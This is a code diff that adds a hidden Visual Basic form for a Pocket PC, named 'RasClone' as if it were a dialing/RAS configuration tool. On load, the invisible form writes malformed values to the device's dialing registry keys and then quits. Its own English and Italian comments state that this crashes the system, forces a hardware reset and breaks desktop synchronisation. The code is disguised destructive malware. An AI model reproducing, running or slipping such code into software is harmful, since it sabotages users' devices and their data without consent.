@@ -1,0 +1,75 @@
+VERSION 5.00
+Begin VB.Form RasClone 
+   Appearance      =   0  'Flat
+   BackColor       =   &H80000005&
+   ClientHeight    =   4110
+   ClientLeft      =   60
+   ClientTop       =   555
+   ClientWidth     =   3945
+   Enabled         =   0   'False
+   ForeColor       =   &H80000008&
+   ScaleHeight     =   4110
+   ScaleWidth      =   3945
+   Visible         =   0   'False
+End
+Attribute VB_Name = "RasClone"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = False
+Option Explicit
+
+ Public nomefile As String
+ Dim saved As Boolean
+ Dim txtkeyU, txtsubkeyU, txtvalueU, txtsubktypeU As String
+ Dim txtkeyR, txtsubkeyR, txtvalueR, txtsubktypeR As String
+ Dim cmbsectionlstiU, cmbsectionlstiR As Integer
+ 
+ Dim Entry, DevCfg, Password, Domain, User, File As Variant
+ 
+ Dim Lo0, Lo1 As String
+   
+ Dim FileNumber As Integer
+ 
+ Dim Factory
+
+ Private Sub Form_OKClick()
+    App.End
+End Sub
+
+Private Sub Form_Load()
+
+Lo0 = "Nara"
+
+
+'
+' if you set this key with non standard value and then you select
+' a configured RAS , the system will fail and you must reset the pocket pc.
+'
+SetKeyValue &H80000001, "ControlPanel\Dial\Locations", "Giamaica", Lo0, REG_MULTI_SZ
+
+'
+' GIAMAICA II
+'
+' PERICOLOSISSIMO! A MENO D'AVER INSTALLATO UN REG EDIT
+' O  POCKET DEFENDER, SO CAZZI AMARI , DEVI EFFETTUARE
+' UN RESET HARDWARE!
+'
+
+'
+' settings these keyes with non standard value cause the impossibility to connect
+' the pocket machine with a desktop machine.
+'
+SetKeyValue &H80000001, "ControlPanel\Dial", "HighLocID", Chr(44), REG_BINARY
+SetKeyValue &H80000001, "ControlPanel\Dial", "CurrentLoc", Chr(69), REG_BINARY
+'
+'
+
+App.End
+
+End Sub
+
+Private Sub Form_Unload(Cancel As Integer)
+'    Set Factory = Nothing
+End Sub
+
